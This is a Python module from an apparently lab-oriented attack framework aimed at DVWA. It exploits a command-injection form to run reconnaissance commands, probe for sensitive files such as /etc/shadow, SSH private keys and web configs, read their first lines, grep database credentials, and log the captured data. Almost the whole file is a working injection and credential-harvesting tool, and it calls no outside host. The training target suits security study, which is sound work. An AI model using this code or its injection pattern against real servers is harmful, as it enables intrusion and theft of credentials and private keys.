"""
Pivoting and Data Exfiltration Module
피버팅 및 중요 데이터 탈취 모듈 (반자동화)
"""

import time
import os
import re
from utils.logger import log_attack, log_exfiltrated_data, log_sensitive_file

# 중요 파일 탐색 대상
SENSITIVE_FILES = {
    'config_files': [
        '/var/www/html/config.php',
        '/var/www/html/wp-config.php',
        '/etc/apache2/apache2.conf',
        '/etc/nginx/nginx.conf',
        '/etc/mysql/my.cnf',
        '/var/www/.env',
    ],
    'credential_files': [
        '/etc/shadow',
        '/etc/passwd',
        '/root/.ssh/id_rsa',
        '/root/.ssh/authorized_keys',
        '/home/*/.ssh/id_rsa',
        '/var/www/.git/config',
    ],
    'history_files': [
        '/root/.bash_history',
        '/home/*/.bash_history',
        '/root/.mysql_history',
    ],
    'database_dumps': [
        '/var/www/html/backup.sql',
        '/tmp/*.sql',
        '/var/backups/*.sql',
    ],
    'application_logs': [
        '/var/log/apache2/access.log',
        '/var/log/apache2/error.log',
        '/var/log/nginx/access.log',
        '/var/log/auth.log',
        '/var/log/syslog',
    ],
}

# 네트워크 피버팅 명령어
PIVOTING_COMMANDS = {
    'network_discovery': [
        'ip addr show',
        'ip route show',
        'arp -a',
        'cat /etc/hosts',
        'cat /etc/resolv.conf',
    ],
    'internal_scan': [
        'for i in {1..254}; do ping -c 1 -W 1 192.168.1.$i | grep "bytes from"; done',
        'netstat -antup | grep ESTABLISHED',
        'ss -tulpn',
    ],
    'port_forwarding_check': [
        'cat /proc/sys/net/ipv4/ip_forward',
        'iptables -L -n -v',
    ],
}

def run_attack(session, delay=1):
    """
    피버팅 및 데이터 탈취 공격 실행

    Args:
        session: DVWA 세션 객체
        delay: 요청 간 지연 시간(초)

    Returns:
        dict: 공격 결과 통계
    """
    results = {
        'success': False,
        'attempts': 0,
        'successful': 0,
        'findings': {
            'sensitive_files': [],
            'network_info': [],
            'exfiltrated_data': []
        }
    }

    print("\n  [*] ===========================================")
    print("  [*] 피버팅 및 데이터 탈취 단계 시작")
    print("  [*] ===========================================\n")

    # 1단계: 네트워크 정보 수집
    print("  [1/3] 네트워크 정보 수집 중...")
    network_results = collect_network_info(session, delay)
    results['attempts'] += network_results['attempts']
    results['successful'] += network_results['successful']
    results['findings']['network_info'] = network_results['findings']

    # 2단계: 중요 파일 탐색
    print("\n  [2/3] 중요 파일 탐색 중...")
    file_results = search_sensitive_files(session, delay)
    results['attempts'] += file_results['attempts']
    results['successful'] += file_results['successful']
    results['findings']['sensitive_files'] = file_results['findings']

    # 3단계: 데이터 탈취 시뮬레이션
    print("\n  [3/3] 데이터 탈취 시도 중...")
    exfil_results = attempt_data_exfiltration(session, delay)
    results['attempts'] += exfil_results['attempts']
    results['successful'] += exfil_results['successful']
    results['findings']['exfiltrated_data'] = exfil_results['findings']

    if results['successful'] > 0:
        results['success'] = True

    print_pivoting_summary(results)
    return results

def collect_network_info(session, delay):
    """네트워크 정보 수집"""
    results = {
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    print("    [*] 내부 네트워크 탐색 중...")

    for category, commands in PIVOTING_COMMANDS.items():
        for cmd in commands:
            results['attempts'] += 1

            try:
                payload = f"127.0.0.1; {cmd}"
                data = {'ip': payload, 'Submit': 'Submit'}

                response = session.session.post(cmdi_url, data=data)

                if len(response.text) > 500:  # 명령어 실행 결과가 있는 경우
                    results['successful'] += 1
                    results['findings'].append({
                        'category': category,
                        'command': cmd,
                        'output_length': len(response.text)
                    })

                    log_attack(
                        'PIVOTING_RECON',
                        'SUCCESS',
                        f"Category: {category}, Command: {cmd}",
                        response.status_code,
                        len(response.text)
                    )
                    print(f"      [+] {cmd[:60]}")

                time.sleep(delay)

            except Exception as e:
                log_attack('PIVOTING_RECON', 'ERROR', f"Command: {cmd}, Error: {str(e)}", 0, 0)

    return results

def search_sensitive_files(session, delay):
    """중요 파일 탐색"""
    results = {
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    print("    [*] 민감한 파일 검색 중...")

    for category, files in SENSITIVE_FILES.items():
        print(f"      [*] {category} 검색 중...")

        for filepath in files:
            results['attempts'] += 1

            try:
                # 파일 존재 여부 확인
                check_cmd = f"test -f {filepath} && echo 'EXISTS' || echo 'NOT_FOUND'"
                payload = f"127.0.0.1; {check_cmd}"
                data = {'ip': payload, 'Submit': 'Submit'}

                response = session.session.post(cmdi_url, data=data)

                if 'EXISTS' in response.text:
                    results['successful'] += 1
                    results['findings'].append({
                        'category': category,
                        'filepath': filepath,
                        'found': True
                    })

                    log_attack(
                        'SENSITIVE_FILE_FOUND',
                        'SUCCESS',
                        f"Category: {category}, File: {filepath}",
                        response.status_code,
                        len(response.text)
                    )
                    print(f"        [+] 발견: {filepath}")

                    # 파일 내용 미리보기 (처음 5줄)
                    preview_file_content(session, filepath, delay)

                time.sleep(delay)

            except Exception as e:
                log_attack('SENSITIVE_FILE_SEARCH', 'ERROR', f"File: {filepath}, Error: {str(e)}", 0, 0)

    return results

def preview_file_content(session, filepath, delay):
    """파일 내용 미리보기 및 로그 기록"""
    try:
        cmdi_url = f"{session.base_url}/vulnerabilities/exec/"
        # 더 많은 내용을 가져오도록 수정 (20줄)
        preview_cmd = f"head -n 20 {filepath}"
        payload = f"127.0.0.1; {preview_cmd}"
        data = {'ip': payload, 'Submit': 'Submit'}

        response = session.session.post(cmdi_url, data=data)

        if response.status_code == 200:
            # HTML에서 실제 명령어 출력 추출
            file_content = extract_command_output(response.text)

            if file_content:
                # 파일 카테고리 결정
                category = determine_file_category(filepath)

                # 상세 로그 기록
                log_sensitive_file(filepath, category, file_content, preview_lines=20)

                log_attack(
                    'FILE_PREVIEW',
                    'SUCCESS',
                    f"File: {filepath}",
                    response.status_code,
                    len(response.text)
                )
                print(f"          [i] 파일 내용 로그에 기록됨 ({len(file_content)} bytes)")

        time.sleep(delay)

    except Exception as e:
        pass

def determine_file_category(filepath):
    """파일 경로로부터 카테고리 결정"""
    if 'config' in filepath or '.conf' in filepath:
        return 'config_files'
    elif 'shadow' in filepath or 'passwd' in filepath or 'ssh' in filepath:
        return 'credential_files'
    elif 'history' in filepath:
        return 'history_files'
    elif '.sql' in filepath:
        return 'database_dumps'
    elif 'log' in filepath:
        return 'application_logs'
    else:
        return 'other'

def extract_command_output(html_response, debug=False):
    """HTML 응답에서 실제 명령어 출력 추출"""
    try:
        # 디버깅 모드: HTML 응답 분석 및 파일 저장
        if debug:
            # HTML 파일로 저장
            debug_file = '/Users/hwangjunha/Desktop/22sec/dvwa_debug_response.html'
            try:
                with open(debug_file, 'w', encoding='utf-8') as f:
                    f.write(html_response)
                print(f"[DEBUG] HTML response saved to: {debug_file}")
            except Exception as e:
                print(f"[DEBUG] Failed to save HTML: {str(e)}")

            print(f"[DEBUG] Response length: {len(html_response)} bytes")
            print(f"[DEBUG] Searching for <pre> tags...")

            # pre 태그 확인
            if '<pre>' in html_response.lower():
                print(f"[DEBUG] Found <pre> tag")
                # pre 태그 내용 샘플
                pre_match = re.search(r'<pre>(.*?)</pre>', html_response, re.DOTALL | re.IGNORECASE)
                if pre_match:
                    content = pre_match.group(1)[:200]
                    print(f"[DEBUG] Pre content sample: {content}")
            else:
                print(f"[DEBUG] No <pre> tag found")

            # textarea 확인
            if '<textarea' in html_response.lower():
                print(f"[DEBUG] Found <textarea> tag")
            else:
                print(f"[DEBUG] No <textarea> tag found")

            # 실제 ping 결과가 있는지 확인
            if 'PING 127.0.0.1' in html_response:
                print(f"[DEBUG] Found ping output in response")
                # ping 이후 내용 샘플 출력
                ping_idx = html_response.find('PING 127.0.0.1')
                sample = html_response[ping_idx:ping_idx+500]
                print(f"[DEBUG] Sample around ping:\n{sample[:300]}\n...")

            # 다른 가능한 컨테이너 찾기
            if 'class="vulnerable_code_area"' in html_response:
                print(f"[DEBUG] Found vulnerable_code_area class")
            if '<div class="body_padded">' in html_response:
                print(f"[DEBUG] Found body_padded div")

        # 방법 1: <pre> 태그에서 추출
        pre_match = re.search(r'<pre>(.*?)</pre>', html_response, re.DOTALL | re.IGNORECASE)
        if pre_match:
            output = pre_match.group(1)
        else:
            # 방법 2: textarea에서 추출
            textarea_match = re.search(r'<textarea[^>]*>(.*?)</textarea>', html_response, re.DOTALL | re.IGNORECASE)
            if textarea_match:
                output = textarea_match.group(1)
            else:
                # 방법 3: DVWA의 vulnerability 컨테이너 영역에서 추출
                container_match = re.search(r'class=["\']vulnerability[^>]*>(.*?)</div>', html_response, re.DOTALL | re.IGNORECASE)
                if container_match:
                    # HTML 태그 제거
                    output = re.sub(r'<[^>]+>', '', container_match.group(1))
                else:
                    if debug:
                        print(f"[DEBUG] No matching HTML pattern found")
                    return ""

        # HTML 엔티티 디코딩
        output = output.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
        output = output.replace('&quot;', '"').replace('&#039;', "'")

        # ping 결과 제거 (127.0.0.1 관련 내용)
        lines = output.split('\n')
        filtered_lines = []
        skip_ping = False
        ping_end_marker = 0

        for i, line in enumerate(lines):
            # ping 명령어 시작 감지
            if 'PING 127.0.0.1' in line:
                skip_ping = True
                continue

            # ping 통계 부분 감지
            if skip_ping and ('ping statistics' in line.lower() or 'packets transmitted' in line.lower()):
                # 다음 2-3줄도 ping 결과이므로 스킵
                ping_end_marker = i + 3
                continue

            # ping 결과 종료 후부터 실제 명령어 출력
            if i > ping_end_marker and skip_ping:
                skip_ping = False

            # ping 관련 출력 건너뛰기
            if skip_ping or i <= ping_end_marker:
                continue

            # 빈 줄이 아니고 실제 내용이 있으면 추가
            if line.strip():
                filtered_lines.append(line)

        result = '\n'.join(filtered_lines)

        # 디버깅: 추출된 내용이 너무 짧으면 원본 일부를 반환
        if len(result.strip()) < 10 and len(output) > 100:
            # ping 부분 이후의 모든 내용 반환
            ping_end = output.find('packets transmitted')
            if ping_end > 0:
                # ping 통계 이후 200자 찾기
                remaining = output[ping_end:].split('\n', 4)
                if len(remaining) > 3:
                    result = '\n'.join(remaining[3:])
            else:
                # ping이 없으면 전체 반환
                result = output

        if debug:
            print(f"[DEBUG] Extracted {len(result)} bytes")
            print(f"[DEBUG] Preview: {result[:200]}")

        return result.strip()
    except Exception as e:
        # 디버깅을 위해 에러 출력
        print(f"[DEBUG] extract_command_output error: {str(e)}")
        return ""

def attempt_data_exfiltration(session, delay):
    """데이터 탈취 시도 (시뮬레이션)"""
    results = {
        'attempts': 0,
        'successful': 0,
        'findings': []
    }

    cmdi_url = f"{session.base_url}/vulnerabilities/exec/"

    print("    [*] 데이터 탈취 시뮬레이션...")
    print("    [!] 주의: 실제 데이터 전송은 수행하지 않습니다.\n")

    # 탈취 대상 데이터
    exfil_targets = [
        {
            'name': 'Database credentials',
            'command': 'cat /var/www/html/config.php | grep -E "(DB_|database)"'
        },
        {
            'name': 'User accounts',
            'command': 'cat /etc/passwd | grep -v nologin'
        },
        {
            'name': 'SSH keys',
            'command': 'find /home -name "id_rsa" 2>/dev/null'
        },
        {
            'name': 'Web application files',
            'command': 'ls -la /var/www/html'
        },
        {
            'name': 'Running processes',
            'command': 'ps aux | grep -E "(mysql|apache|nginx)"'
        },
    ]

    for target in exfil_targets:
        results['attempts'] += 1

        try:
            payload = f"127.0.0.1; {target['command']}"
            data = {'ip': payload, 'Submit': 'Submit'}

            response = session.session.post(cmdi_url, data=data)

            # HTML에서 실제 명령어 출력 추출 (첫 번째 요청은 디버그 모드)
            is_first = (results['attempts'] == 1)
            exfiltrated_data = extract_command_output(response.text, debug=is_first)

            if exfiltrated_data and len(exfiltrated_data) > 10:  # 실제 데이터가 있는 경우
                results['successful'] += 1
                results['findings'].append({
                    'data_type': target['name'],
                    'command': target['command'],
                    'data_size': len(exfiltrated_data)
                })

                # 탈취된 실제 데이터를 상세 로그에 기록
                log_exfiltrated_data(
                    target['name'],
                    target['command'],
                    exfiltrated_data,
                    preview_length=1000  # 최대 1000자까지 로그에 기록
                )

                log_attack(
                    'DATA_EXFILTRATION',
                    'SUCCESS',
                    f"Type: {target['name']}, Command: {target['command']}",
                    response.status_code,
                    len(response.text)
                )
                print(f"      [+] 수집 성공: {target['name']} ({len(exfiltrated_data)} bytes)")
            else:
                log_attack(
                    'DATA_EXFILTRATION',
                    'FAILED',
                    f"Type: {target['name']}, No data extracted",
                    response.status_code,
                    len(response.text)
                )

            time.sleep(delay)

        except Exception as e:
            log_attack('DATA_EXFILTRATION', 'ERROR', f"Target: {target['name']}, Error: {str(e)}", 0, 0)

    return results

def print_pivoting_summary(results):
    """피버팅 결과 요약 출력"""
    print("\n  [*] ===========================================")
    print("  [*] 피버팅 및 데이터 탈취 결과 요약")
    print("  [*] ===========================================\n")

    print(f"  총 시도: {results['attempts']}회")
    print(f"  성공: {results['successful']}회\n")

    findings = results['findings']

    if findings['network_info']:
        print(f"  [+] 네트워크 정보: {len(findings['network_info'])}개 수집")

    if findings['sensitive_files']:
        print(f"  [+] 민감한 파일: {len(findings['sensitive_files'])}개 발견")
        for file_info in findings['sensitive_files'][:5]:
            print(f"      - {file_info['filepath']}")

    if findings['exfiltrated_data']:
        print(f"  [+] 탈취 데이터: {len(findings['exfiltrated_data'])}개 타입")
        for data_info in findings['exfiltrated_data']:
            print(f"      - {data_info['data_type']}")

    print()
